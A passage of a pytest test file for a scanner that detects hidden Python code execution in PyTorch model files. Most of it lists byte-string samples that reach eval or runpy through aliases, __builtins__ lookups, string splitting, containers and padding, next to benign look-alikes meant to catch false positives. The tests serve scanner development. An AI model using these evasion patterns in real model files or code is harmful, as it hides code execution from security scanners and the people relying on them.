            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"    # pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff" + leading_blocks + b"def payload():\n"
            b"    import os\n"
            + padding
            + b"    import runpy as rp\n"
            + padding
            + b"    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_embedded_python_prefix_context_tail_starts_are_bounded(self) -> None:
        prefix = b"\x00\xffimport runpy as rp\n" + b"# prefix\n" * 1024
        tail_blocks = b"".join(
            f'def harmless_{index}():\n    """rp.run_path(\'payload.py\')"""\n    return {index}\n'.encode()
            for index in range(128)
        )
        data = prefix + (b"# middle\n" * 130_000) + tail_blocks

        windows = jit_script_module._embedded_python_extraction_windows(data)

        assert len(windows) <= 3 + (2 * jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS)

    def test_single_window_prefix_context_is_extracted_once(self, monkeypatch: pytest.MonkeyPatch) -> None:
        original_is_priority_context = jit_script_module._is_priority_prefix_context_statement
        priority_context_checks = 0

        def recording_is_priority_context(context: bytes, statement: bytes) -> bool:
            nonlocal priority_context_checks
            priority_context_checks += 1
            return original_is_priority_context(context, statement)

        monkeypatch.setattr(
            jit_script_module,
            "_is_priority_prefix_context_statement",
            recording_is_priority_context,
        )
        data = b"\x00\xffsink = eval\n" + b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode() for index in range(128)
        )

        windows = jit_script_module._embedded_python_extraction_windows(data)

        assert windows
        assert priority_context_checks == 1

    def test_scan_model_does_not_flag_builtin_substring_inside_identifier(self) -> None:
        detector = JITScriptDetector()
        data = b"\x00\xffdef benign_weight_marker():\n    opened = 1\n    file_count = opened\n    return file_count\n"

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert not any(finding.type == "dangerous_builtin" for finding in findings)
        assert not any(finding.severity == "CRITICAL" for finding in findings)

    def test_scan_model_detects_alias_to_dangerous_builtin(self) -> None:
        detector = JITScriptDetector()
        data = b"\x00\xffdef payload(value):\n    sink = eval\n    return sink(value)\n"

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(finding.type == "dangerous_builtin" and finding.builtin == "eval" for finding in findings)

    def test_scan_model_detects_alias_to_builtins_module(self) -> None:
        detector = JITScriptDetector()
        data = b"\x00\xffdef payload(value):\n    import builtins as b\n    module = b\n    return module.eval(value)\n"

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(finding.type == "dangerous_builtin" and finding.builtin == "eval" for finding in findings)

    @pytest.mark.parametrize(
        "body",
        [
            "return __builtins__.eval(value)",
            "return __builtin__.eval(value)",
            "return __builtins__['eval'](value)",
            "return __builtin__.__dict__['eval'](value)",
            "return getattr(__builtins__, 'eval')(value)",
            "return __builtins__.get('eval')(value)",
            "return __builtins__.__getitem__('eval')(value)",
            "return __builtins__['ev' + 'al'](value)",
            "return globals()['__builtins__']['eval'](value)",
            "return globals().get('__builtins__').eval(value)",
            "return eval.__call__(value)",
            "sink = eval.__call__\n    return sink(value)",
            "return getattr(eval, '__call__')(value)",
            "return __builtins__.eval.__call__(value)",
            "return __builtins__.__getattribute__('eval')(value)",
            "module = __builtins__\n    return module.eval(value)",
            "module = __builtins__ if value else object()\n    return module.eval(value)",
            "import __builtin__ as module\n    return module.eval(value)",
            "namespace = __builtins__.__dict__\n    return namespace['eval'](value)",
            "namespace = vars(__builtins__)\n    return namespace.get('eval')(value)",
        ],
    )
    def test_scan_model_detects_dangerous_dunder_builtins_access(self, body: str) -> None:
        detector = JITScriptDetector()
        data = f"\x00\xffdef payload(value):\n    {body}\n".encode()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(finding.type == "dangerous_builtin" and finding.builtin == "eval" for finding in findings)

    @pytest.mark.parametrize(
        "body",
        [
            "callbacks = [eval]\n    return callbacks[0](value)",
            "callbacks = {'run': eval}\n    return callbacks['run'](value)",
            "callbacks = {'run': eval}\n    return callbacks.get('run')(value)",
            "callbacks = [len, eval]\n    alias = callbacks\n    return alias[1](value)",
            "callbacks = [[eval]]\n    return callbacks[0][0](value)",
            "callbacks = [len, eval]\n    return callbacks[-1](value)",
            "callbacks = [len]\n    callbacks[-1] = eval\n    return callbacks[0](value)",
            "callbacks = [len]\n    callbacks[0] = eval\n    return callbacks[-1](value)",
            "callbacks = [len]\n    alias = callbacks\n    alias[0] = eval\n    return callbacks[0](value)",
            "callbacks = alias = [len]\n    alias[0] = eval\n    return callbacks[0](value)",
            "callbacks = [eval]\n    independent = [eval]\n    callbacks[0] = len\n    return independent[0](value)",
            "callbacks = [eval] if value else {0: len}\n    return callbacks[0](value)",
            "callbacks = [len] if value else {0: eval}\n    return callbacks[0](value)",
            "return object.__getattribute__(__builtins__, 'eval')(value)",
            "holder.sink = eval\n    return holder.sink(value)",
            "setattr(holder, 'sink', eval)\n    return holder.sink(value)",
            "object.__setattr__(holder, 'sink', eval)\n    return holder.sink(value)",
        ],
    )
    def test_scan_model_detects_dangerous_builtins_through_indirect_storage(self, body: str) -> None:
        detector = JITScriptDetector()
        data = f"\x00\xffdef payload(value, holder):\n    {body}\n".encode()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(finding.type == "dangerous_builtin" and finding.builtin == "eval" for finding in findings)

    @pytest.mark.parametrize(
        "data",
        [
            b"\x00\xffclass H:\n    sink = eval\nH().sink('1+1')\n",
            b"\x00\xffclass H:\n    sink = eval\nholder = H()\nholder.sink('1+1')\n",
            (b"\x00\xffdef payload(holder):\n    holder.__dict__['sink'] = eval\n    return holder.sink('1+1')\n"),
            (b"\x00\xffdef payload(holder):\n    vars(holder)['sink'] = eval\n    return holder.sink('1+1')\n"),
            (b"\x00\xffdef framing():\n    return None\nglobals()['sink'] = eval\nsink('1+1')\n"),
            (b"\x00\xffsink = None\ndef configure():\n    global sink\n    sink = eval\nconfigure()\nsink('1+1')\n"),
            (
                b"\x00\xffdef outer():\n"
                b"    sink = None\n"
                b"    def configure():\n"
                b"        nonlocal sink\n"
                b"        sink = eval\n"
                b"    configure()\n"
                b"    return sink('1+1')\n"
                b"outer()\n"
            ),
            (
                b"\x00\xffdef payload():\n"
                b"    match {'run': eval}:\n"
                b"        case {'run': sink}:\n"
                b"            return sink('1+1')\n"
            ),
            (
                b"\x00\xffdef payload():\n"
                b"    callbacks = {'run': eval}\n"
                b"    match callbacks:\n"
                b"        case {'run': sink}:\n"
                b"            return sink('1+1')\n"
            ),
            (b"\x00\xffeval = lambda value: value\nfrom builtins import *\neval('1+1')\n"),
        ],
    )
    def test_scan_model_detects_dangerous_builtins_across_extended_alias_transfers(self, data: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(finding.type == "dangerous_builtin" and finding.builtin == "eval" for finding in findings)

    @pytest.mark.parametrize(
        "data",
        [
            b"\x00\xffclass H:\n    sink = eval\n    sink = len\nH().sink([])\n",
            (b"\x00\xffclass H:\n    sink = eval\nholder = H()\nholder.sink = len\nholder.sink([])\n"),
            (
                b"\x00\xffdef benign(holder):\n"
                b"    holder.__dict__['sink'] = eval\n"
                b"    holder.__dict__['sink'] = len\n"
                b"    return holder.sink([])\n"
            ),
            (
                b"\x00\xffdef benign(holder):\n"
                b"    vars = lambda value: value.storage\n"
                b"    vars(holder)['sink'] = eval\n"
                b"    return holder.sink([])\n"
            ),
            (
                b"\x00\xffdef framing():\n"
                b"    return None\n"
                b"globals = lambda: {}\n"
                b"globals()['sink'] = eval\n"
                b"sink = len\n"
                b"sink([])\n"
            ),
            (b"\x00\xffsink = len\ndef configure():\n    global sink\n    sink = eval\nsink([])\n"),
            (b"\x00\xffsink = eval\ndef configure():\n    global sink\n    sink = len\nconfigure()\nsink([])\n"),
            (
                b"\x00\xffdef benign():\n"
                b"    sink = eval\n"
                b"    def configure():\n"
                b"        nonlocal sink\n"
                b"        sink = len\n"
                b"    configure()\n"
                b"    return sink([])\n"
            ),
            (
                b"\x00\xffdef benign():\n"
                b"    match {'safe': len, 'unused': eval}:\n"
                b"        case {'safe': sink}:\n"
                b"            return sink([])\n"
            ),
            b"\x00\xfffrom helpers import *\ndef benign(eval):\n    return eval('1+1')\n",
        ],
    )
    def test_scan_model_avoids_false_positives_across_extended_alias_transfers(self, data: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert not any(finding.type == "dangerous_builtin" for finding in findings)
        assert not any(finding.severity == "CRITICAL" for finding in findings)

    @pytest.mark.parametrize(
        "data",
        [
            (
                b"\x00\xffdef benign(value):\n"
                b"    callbacks = [eval]\n"
                b"    callbacks[0] = len\n"
                b"    return callbacks[0](value)\n"
            ),
            (
                b"\x00\xffdef benign(value):\n"
                b"    callbacks = {'safe': len, 'unused': eval}\n"
                b"    return callbacks['safe'](value)\n"
            ),
            (
                b"\x00\xffdef benign(value):\n"
                b"    callbacks = {'run': eval}\n"
                b"    callbacks['run'] = len\n"
                b"    return callbacks.get('run')(value)\n"
            ),
            (
                b"\x00\xffdef benign(value):\n"
                b"    callbacks = [[eval]]\n"
                b"    callbacks[0][0] = len\n"
                b"    return callbacks[0][0](value)\n"
            ),
            (
                b"\x00\xffdef benign(value):\n"
                b"    callbacks = [eval]\n"
                b"    callbacks[0] = len\n"
                b"    return callbacks[-1](value)\n"
            ),
            (
                b"\x00\xffdef benign(value):\n"
                b"    callbacks = [eval]\n"
                b"    callbacks[-1] = len\n"
                b"    return callbacks[0](value)\n"
            ),
            (
                b"\x00\xffdef benign(value):\n"
                b"    callbacks = [eval]\n"
                b"    alias = callbacks\n"
                b"    alias[0] = len\n"
                b"    return callbacks[0](value)\n"
            ),
            (
                b"\x00\xffdef benign(value, flag):\n"
                b"    callbacks = [eval] if flag else {0: eval}\n"
                b"    callbacks[0] = len\n"
                b"    return callbacks[0](value)\n"
            ),
            (
                b"\x00\xffdef benign(value):\n"
                b"    object = helper\n"
                b"    return object.__getattribute__(__builtins__, 'eval')(value)\n"
            ),
            (
                b"\x00\xffdef benign(value, holder):\n"
                b"    holder.sink = eval\n"
                b"    holder.sink = len\n"
                b"    return holder.sink(value)\n"
            ),
            (
                b"\x00\xffdef benign(value, holder):\n"
                b"    holder.sink = eval\n"
                b"    holder = replacement\n"
                b"    return holder.sink(value)\n"
            ),
            (
                b"\x00\xffdef benign(value, holder):\n"
                b"    setattr(holder, 'sink', eval)\n"
                b"    setattr(holder, 'sink', len)\n"
                b"    return holder.sink(value)\n"
            ),
            (
                b"\x00\xffdef benign(value, holder):\n"
                b"    setattr(holder, 'sink', eval)\n"
                b"    holder = replacement\n"
                b"    return holder.sink(value)\n"
            ),
            (
                b"\x00\xffdef benign(value, holder):\n"
                b"    object.__setattr__(holder, 'sink', eval)\n"
                b"    object.__setattr__(holder, 'sink', len)\n"
                b"    return holder.sink(value)\n"
            ),
            (
                b"\x00\xffdef benign(value, holder, setattr):\n"
                b"    setattr(holder, 'sink', eval)\n"
                b"    return holder.sink(value)\n"
            ),
            (
                b"\x00\xffdef benign(value, holder, object):\n"
                b"    object.__setattr__(holder, 'sink', eval)\n"
                b"    return holder.sink(value)\n"
            ),
            (b"\x00\xffcallbacks = [eval]\ndef benign(value, callbacks):\n    return callbacks[0](value)\n"),
            (b"\x00\xffdef benign(value, callbacks=[eval]):\n    callbacks[0] = len\n    return callbacks[0](value)\n"),
        ],
    )
    def test_scan_model_avoids_stale_indirect_builtin_aliases(self, data: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert not any(finding.type == "dangerous_builtin" for finding in findings)

    @pytest.mark.parametrize(
        "data",
        [
            (b"\x00\xffdef payload(value, callbacks=[eval]):\n    return callbacks[0](value)\n"),
            (b"\x00\xffdef payload(value, *, callbacks={'run': eval}):\n    return callbacks['run'](value)\n"),
        ],
    )
    def test_scan_model_detects_dangerous_builtins_in_default_containers(self, data: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(finding.type == "dangerous_builtin" and finding.builtin == "eval" for finding in findings)

    @pytest.mark.parametrize(
        "body",
        [
            "return list(map(eval, values))",
            "return list(filter(eval, values))",
            "return sorted(values, key=eval)",
            "return min(values, key=eval)",
            "return max(values, key=eval)",
            "import functools\n    return functools.partial(eval, values[0])()",
            "import functools as ft\n    return ft.partial(eval, values[0])()",
            "from functools import partial as bind\n    runner = bind(eval, values[0])\n    return runner()",
        ],
    )
    def test_scan_model_detects_dangerous_builtins_used_as_callbacks(self, body: str) -> None:
        detector = JITScriptDetector()
        data = f"\x00\xffdef payload(values):\n    {body}\n".encode()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(finding.type == "dangerous_builtin" and finding.builtin == "eval" for finding in findings)

    @pytest.mark.parametrize(
        "data",
        [
            (b"\x00\xffdef benign(values, map):\n    return list(map(eval, values))\n"),
            (b"\x00\xffdef benign(values, sorted):\n    return sorted(values, key=eval)\n"),
            (b"\x00\xffdef benign(value, functools):\n    return functools.partial(eval, value)()\n"),
            (
                b"\x00\xffdef benign(value):\n"
                b"    from functools import partial\n"
                b"    partial = helper\n"
                b"    return partial(eval, value)()\n"
            ),
            (b"\x00\xffdef benign(value):\n    import functools\n    return functools.partial(eval, value)\n"),
            (b"\x00\xffdef benign(value):\n    return helper(eval, value)\n"),
        ],
    )
    def test_scan_model_avoids_noninvoking_or_shadowed_callback_lookalikes(self, data: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert not any(finding.type == "dangerous_builtin" for finding in findings)

    @pytest.mark.parametrize(
        "body",
        [
            "callbacks = [eval]\n    (sink,) = callbacks\n    return sink(value)",
            "callbacks = [[eval]]\n    ((sink,),) = callbacks\n    return sink(value)",
            "callbacks = [eval]\n    for sink in callbacks:\n        return sink(value)",
            "callbacks = [(eval, 1)]\n    for sink, _ in callbacks:\n        return sink(value)",
        ],
    )
    def test_scan_model_resolves_dangerous_builtins_from_tracked_sequence_state(self, body: str) -> None:
        detector = JITScriptDetector()
        data = f"\x00\xffdef payload(value):\n    {body}\n".encode()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(finding.type == "dangerous_builtin" and finding.builtin == "eval" for finding in findings)

    @pytest.mark.parametrize(
        "body",
        [
            "callbacks = [eval]\n    callbacks[0] = len\n    (sink,) = callbacks\n    return sink(value)",
            "callbacks = [eval]\n    callbacks[0] = len\n    for sink in callbacks:\n        return sink(value)",
            "callbacks = {0: eval}\n    (sink,) = callbacks\n    return sink(value)",
            "callbacks = {'run': eval}\n    for sink in callbacks:\n        return sink(value)",
        ],
    )
    def test_scan_model_avoids_stale_tracked_sequence_state(self, body: str) -> None:
        detector = JITScriptDetector()
        data = f"\x00\xffdef benign(value):\n    {body}\n".encode()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert not any(finding.type == "dangerous_builtin" for finding in findings)

    @pytest.mark.parametrize(
        "body",
        [
            "name = 'eval'\n    return getattr(__builtins__, name)(value)",
            "name = 'ev' + 'al'\n    return __builtins__[name](value)",
            "name = 'eval'\n    return __builtins__.get(name)(value)",
            "name = 'eval'\n    return object.__getattribute__(__builtins__, name)(value)",
            "callbacks = {'run': eval}\n    name = 'run'\n    return callbacks[name](value)",
            "def inner(name='eval'):\n        return getattr(__builtins__, name)(value)\n    return inner()",
        ],
    )
    def test_scan_model_resolves_constant_string_aliases_for_builtin_lookup(self, body: str) -> None:
        detector = JITScriptDetector()
        data = f"\x00\xffdef payload(value):\n    {body}\n".encode()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(finding.type == "dangerous_builtin" and finding.builtin == "eval" for finding in findings)

    @pytest.mark.parametrize(
        "body",
        [
            "name = 'eval'\n    name = 'len'\n    return getattr(__builtins__, name)(value)",
            (
                "name = 'eval'\n    if False:\n        name = 'len'\n"
                "    name = 'len'\n    return __builtins__[name](value)"
            ),
            (
                "callbacks = {'run': eval}\n    name = 'run'\n    name = 'safe'\n"
                "    callbacks['safe'] = len\n    return callbacks[name](value)"
            ),
            (
                "def inner(name='eval'):\n        name = 'len'\n"
                "        return getattr(__builtins__, name)(value)\n    return inner()"
            ),
        ],
    )
    def test_scan_model_avoids_stale_constant_string_aliases(self, body: str) -> None:
        detector = JITScriptDetector()
        data = f"\x00\xffdef benign(value):\n    {body}\n".encode()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert not any(finding.type == "dangerous_builtin" for finding in findings)

    @pytest.mark.parametrize(
        "data",
        [
            (
                b"\x00\xffclass Payload:\n"
                b"    def prepare(self):\n"
                b"        self.sink = eval\n"
                b"    def run(self, value):\n"
                b"        return self.sink(value)\n"
            ),
            (
                b"\x00\xffclass Payload:\n"
                b"    def prepare(self):\n"
                b"        setattr(self, 'sink', eval)\n"
                b"    def run(self, value):\n"
                b"        return self.sink(value)\n"
            ),
            (b"\x00\xffclass Payload:\n    sink = eval\n    def run(self, value):\n        return self.sink(value)\n"),
        ],
    )
    def test_scan_model_detects_dangerous_instance_aliases_across_methods(self, data: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(finding.type == "dangerous_builtin" and finding.builtin == "eval" for finding in findings)

    @pytest.mark.parametrize(
        "data",
        [
            (
                b"\x00\xffclass Benign:\n"
                b"    def prepare(self):\n"
                b"        self.sink = eval\n"
                b"        self.sink = len\n"
                b"    def run(self, value):\n"
                b"        return self.sink(value)\n"
            ),
            (
                b"\x00\xffclass Benign:\n"
                b"    def prepare(self):\n"
                b"        self.sink = eval\n"
                b"    def run(self, value):\n"
                b"        self.sink = len\n"
                b"        return self.sink(value)\n"
            ),
            (
                b"\x00\xffclass Benign:\n"
                b"    @staticmethod\n"
                b"    def prepare(holder):\n"
                b"        holder.sink = eval\n"
                b"    @staticmethod\n"
                b"    def run(holder, value):\n"
                b"        return holder.sink(value)\n"
            ),
        ],
    )
    def test_scan_model_avoids_stale_instance_aliases_across_methods(self, data: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert not any(finding.type == "dangerous_builtin" for finding in findings)

    def test_scan_model_preserves_builtin_alias_across_dead_rebind_branch(self) -> None:
        detector = JITScriptDetector()
        data = b"\x00\xffdef payload():\n    sink = eval\n    if False:\n        sink = len\n    return sink('1+1')\n"

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(finding.type == "dangerous_builtin" and finding.builtin == "eval" for finding in findings)

    @pytest.mark.parametrize(
        "data",
        [
            (
                b"\x00\xffdef payload():\n"
                b"    sink = eval\n"
                b"    for _ in []:\n"
                b"        sink = len\n"
                b"    return sink('1+1')\n"
            ),
            (
                b"\x00\xffdef payload():\n"
                b"    sink = eval\n"
                b"    while False:\n"
                b"        sink = len\n"
                b"    return sink('1+1')\n"
            ),
            b"\x00\xffdef payload(flag):\n    sink = eval if flag else len\n    return sink('1+1')\n",
            (
                b"\x00\xffdef payload():\n"
                b"    sink = eval\n"
                b"    try:\n"
                b"        raise RuntimeError()\n"
                b"        sink = len\n"
                b"    except RuntimeError:\n"
                b"        pass\n"
                b"    return sink('1+1')\n"
            ),
            (
                b"\x00\xffdef payload():\n"
                b"    sink = eval\n"
                b"    try:\n"
                b"        may_raise()\n"
                b"        sink = len\n"
                b"    except Exception:\n"
                b"        pass\n"
                b"    return sink('1+1')\n"
            ),
            (
                b"\x00\xffdef payload():\n"
                b"    sink = eval\n"
                b"    try:\n"
                b"        sink = unresolved_name\n"
                b"    except Exception:\n"
                b"        pass\n"
                b"    return sink('1+1')\n"
            ),
            b"\x00\xffdef payload():\n    for sink in [eval]:\n        return sink('1+1')\n",
            b"\x00\xffdef payload():\n    for sink in [len, eval]:\n        sink('1+1')\n",
            b"\x00\xffdef payload():\n    for sink, _ in [(eval, 1)]:\n        return sink('1+1')\n",
            b"\x00\xffdef payload():\n    for module in [__builtins__]:\n        return module.eval('1+1')\n",
            b"\x00\xffdef payload():\n    return [sink('1+1') for sink in [eval]]\n",
            b"\x00\xffdef payload():\n    return list(sink('1+1') for sink in [eval])\n",
            b"\x00\xffdef payload():\n    return (sink := eval)('1+1')\n",
            b"\x00\xffdef payload():\n    return (eval or len)('1+1')\n",
            b"\x00\xffdef payload(sink=eval):\n    return sink('1+1')\n",
            (b"\x00\xffsink = eval\ndef payload(value: sink('1+1')):\n    return value\n"),
            b"\x00\xffsink = eval\ndef payload():\n    return sink('1+1')\n",
            b"\x00\xffmodule = __builtins__\ndef payload():\n    return module.eval('1+1')\n",
            b"\x00\xffsink = eval\ndef sink(value=sink('1+1')):\n    return value\n",
            b"\x00\xffsink = eval\nclass sink(sink('1+1')):\n    pass\n",
            (
                b"\x00\xffdef outer():\n"
                b"    sink = eval\n"
                b"    def inner():\n"
                b"        return sink('1+1')\n"
                b"    return inner()\n"
            ),
            b"\x00\xffclass Payload:\n    sink = eval\n    result = sink('1+1')\n",
            b"\x00\xffdef payload():\n    [sink := eval for _ in [1]]\n    return sink('1+1')\n",
            (b"\x00\xffclass Payload:\n    sink = eval\n    values = [value for value in sink('[1]')]\n"),
            (b"\x00\xffsink = eval\nclass Payload:\n    sink = len\n    def run(self):\n        return sink('1+1')\n"),
            (b"\x00\xffdef payload():\n    match [eval]:\n        case [sink]:\n            return sink('1+1')\n"),
            (
                b"\x00\xffdef payload(value):\n"
                b"    sink = len\n"
                b"    match value:\n"
                b"        case 0:\n"
                b"            sink = eval\n"
                b"        case _:\n"
                b"            sink = len\n"
                b"    return sink('1+1')\n"
            ),
        ],
    )
    def test_scan_model_preserves_builtin_alias_across_dead_control_flow(self, data: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert any(finding.type == "dangerous_builtin" and finding.builtin == "eval" for finding in findings)

    @pytest.mark.parametrize(
        "data",
        [
            (b"\x00\xffdef benign():\n    import builtins as b\n    b = object()\n    return b.eval('1')\n"),
            b"\x00\xffdef benign(builtins):\n    return builtins.eval('1')\n",
            b"\x00\xffdef benign(__builtins__):\n    return __builtins__.eval('1')\n",
            b"\x00\xffdef benign(eval):\n    return eval.__call__('1')\n",
            b"\x00\xffdef benign():\n    __builtins__ = object()\n    return __builtins__.eval('1')\n",
            (
                b"\x00\xffdef benign():\n"
                b"    getattr = lambda _value, _name: len\n"
                b"    return getattr(__builtins__, 'eval')('1')\n"
            ),
            (
                b"\x00\xffdef benign():\n"
                b"    vars = lambda _value: {'eval': len}\n"
                b"    return vars(__builtins__)['eval']('1')\n"
            ),
            (
                b"\x00\xffdef benign():\n"
                b"    globals = lambda: {'__builtins__': {'eval': len}}\n"
                b"    return globals()['__builtins__']['eval']('1')\n"
            ),
            (b"\x00\xffdef benign():\n    __builtins__ = {'eval': len}\n    return __builtins__['eval']('1')\n"),
            (b"\x00\xffdef benign():\n    sink = eval\n    for _ in [1]:\n        sink = len\n    return sink('1')\n"),
            (
                b"\x00\xffdef benign():\n"
                b"    sink = eval\n"
                b"    while True:\n"
                b"        sink = len\n"
                b"        break\n"
                b"    return sink('1')\n"
            ),
            b"\x00\xffdef benign():\n    sink = eval if False else len\n    return sink('1')\n",
            (
                b"\x00\xffdef benign():\n"
                b"    sink = eval\n"
                b"    try:\n"
                b"        sink = len\n"
                b"    except Exception:\n"
                b"        sink = str\n"
                b"    return sink('1')\n"
            ),
            (
                b"\x00\xffdef benign():\n"
                b"    sink = eval\n"
                b"    try:\n"
                b"        sink = len\n"
                b"    except Exception:\n"
                b"        pass\n"
                b"    return sink('1')\n"
            ),
            (
                b"\x00\xffdef benign():\n"
                b"    safe_alias = len\n"
                b"    sink = eval\n"
                b"    try:\n"
                b"        sink = safe_alias\n"
                b"    except Exception:\n"
                b"        pass\n"
                b"    return sink('1')\n"
            ),
            (
                b"\x00\xffdef benign():\n"
                b"    sink = eval\n"
                b"    try:\n"
                b"        sink = len\n"
                b"        may_raise()\n"
                b"    except Exception:\n"
                b"        pass\n"
                b"    return sink('1')\n"
            ),
            (b"\x00\xffdef benign():\n    for sink in [eval, len]:\n        pass\n    return sink('1')\n"),
            (b"\x00\xffdef benign():\n    for sink in [len, eval]:\n        break\n    return sink('1')\n"),
            (
                b"\x00\xffdef benign():\n"
                b"    sink = eval\n"
                b"    for _ in [1]:\n"
                b"        pass\n"
                b"    else:\n"
                b"        sink = len\n"
                b"    return sink('1')\n"
            ),
            b"\x00\xffdef benign():\n    return [sink('1') for sink in [eval] if False]\n",
            b"\x00\xffdef benign():\n    return [sink('1') for sink in [eval] for _ in []]\n",
            b"\x00\xffdef benign():\n    return [sink('1') for sink in [len]]\n",
            b"\x00\xffdef benign(holder):\n    return holder.__builtins__.eval('1')\n",
            b"\x00\xffdef benign():\n    return (eval and len)('1')\n",
            b"\x00\xffdef benign():\n    return (len or eval)('1')\n",
            b"\x00\xffdef benign():\n    return (lambda eval: eval('1'))(len)\n",
            b"\x00\xffdef benign():\n    module = __builtins__ if False else object()\n    return module.eval('1')\n",
            b"\x00\xffsink = eval\nsink = len\ndef benign():\n    return sink('1')\n",
            (b"\x00\xffmodule = __builtins__\nmodule = object()\ndef benign():\n    return module.eval('1')\n"),
            b"\x00\xffsink = eval\ndef benign():\n    sink('1')\n    sink = len\n",
            (b"\x00\xffclass Container:\n    sink = eval\n    def benign(self):\n        return sink('1')\n"),
            (b"\x00\xffclass Outer:\n    sink = eval\n    class Inner:\n        result = sink('1')\n"),
            (b"\x00\xffclass Benign:\n    sink = eval\n    values = [sink('1') for _ in [1]]\n"),
            (b"\x00\xffsink = eval\ndef benign():\n    global sink\n    sink = len\n    return sink('1')\n"),
            (
                b"\x00\xffdef outer():\n"
                b"    sink = eval\n"
                b"    def benign():\n"
                b"        nonlocal sink\n"
                b"        sink = len\n"
                b"        return sink('1')\n"
                b"    return benign()\n"
            ),
            (
                b"\x00\xffsink = eval\n"
                b"def benign():\n"
                b"    sink('1')\n"
                b"    def inner(value=(sink := len)):\n"
                b"        return value\n"
            ),
            (b"\x00\xffsink = eval\ndef benign(manager):\n    with manager() as sink:\n        return sink('1')\n"),
            b"\x00\xffdef benign():\n    sink = eval\n    del sink\n    return sink('1')\n",
            (
                b"\x00\xffdef benign():\n"
                b"    for sink in [eval, len]:\n"
                b"        for _ in [1]:\n"
                b"            break\n"
                b"    return sink('1')\n"
            ),
            (
                b"\x00\xffdef benign(value):\n"
                b"    sink = eval\n"
                b"    match value:\n"
                b"        case 0:\n"
                b"            sink = len\n"
                b"        case _:\n"
                b"            sink = str\n"
                b"    return sink('1')\n"
            ),
            (
                b"\x00\xffdef benign(flag):\n"
                b"    sink = eval\n"
                b"    if flag:\n"
                b"        return 0\n"
                b"    else:\n"
                b"        sink = len\n"
                b"    return sink('1')\n"
            ),
            (
                b"\x00\xffdef benign(flag):\n"
                b"    sink = eval\n"
                b"    try:\n"
                b"        if flag:\n"
                b"            raise RuntimeError()\n"
                b"        sink = len\n"
                b"    except RuntimeError:\n"
                b"        return 0\n"
                b"    return sink('1')\n"
            ),
            (
                b"\x00\xffdef benign(value):\n"
                b"    sink = len\n"
                b"    match value:\n"
                b"        case _ if False:\n"
                b"            sink = eval\n"
                b"    return sink('1')\n"
            ),
            (
                b"\x00\xffdef benign(flag):\n"
                b"    sink = eval\n"
                b"    while flag:\n"
                b"        sink = eval\n"
                b"        flag = False\n"
                b"    else:\n"
                b"        sink = len\n"
                b"    return sink('1')\n"
            ),
            (
                b"\x00\xffdef benign(flag):\n"
                b"    sink = eval\n"
                b"    while flag:\n"
                b"        sink = len\n"
                b"    else:\n"
                b"        sink = str\n"
                b"    return sink('1')\n"
            ),
            (
                b"\x00\xffdef benign(condition):\n"
                b"    sink = eval\n"
                b"    if condition:\n"
                b"        sink = len\n"
                b"    else:\n"
                b"        sink = str\n"
                b"    return sink('1')\n"
            ),
        ],
    )
    def test_scan_model_does_not_retain_shadowed_builtin_aliases(self, data: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert not any(finding.type == "dangerous_builtin" for finding in findings)
        assert not any(finding.severity == "CRITICAL" for finding in findings)

    @pytest.mark.parametrize(
        "data",
        [
            b"\x00\xffdef benign(stream):\n    return stream.open('x')\n",
            b"\x00\xffdef benign():\n    return 'open'\n",
        ],
    )
    def test_scan_model_does_not_flag_method_or_literal_as_builtin_call(self, data: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert not any(finding.type == "dangerous_builtin" for finding in findings)
        assert not any(finding.type == "ast_dangerous_call" for finding in findings)
        assert not any(finding.severity == "CRITICAL" for finding in findings)

    @pytest.mark.parametrize(
        "data",
        [
            b"\x00\xffdef benign():\n    return 'eval(1)'\n",
            b"\x00\xffdef benign():\n    # eval(1)\n    return 1\n",
        ],
    )
    def test_scan_model_does_not_flag_literal_or_comment_execution_pattern(self, data: bytes) -> None:
        detector = JITScriptDetector()

        findings = detector.scan_model(data, "pytorch", "payload.bin")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "eval() call detected"
            for finding in findings
        )
        assert not any(finding.severity == "CRITICAL" for finding in findings)

    def test_scan_model_carries_prefix_alias_shadowing_into_tail_context(self) -> None:
        detector = JITScriptDetector()
        prefix = b"\x00\xffclass Safe:\n    run_path = len\nimport runpy as rp\nrp = Safe()\n" + b"# prefix\n" * 1024
        tail = b"def payload():\n    return rp.run_path([])\n"
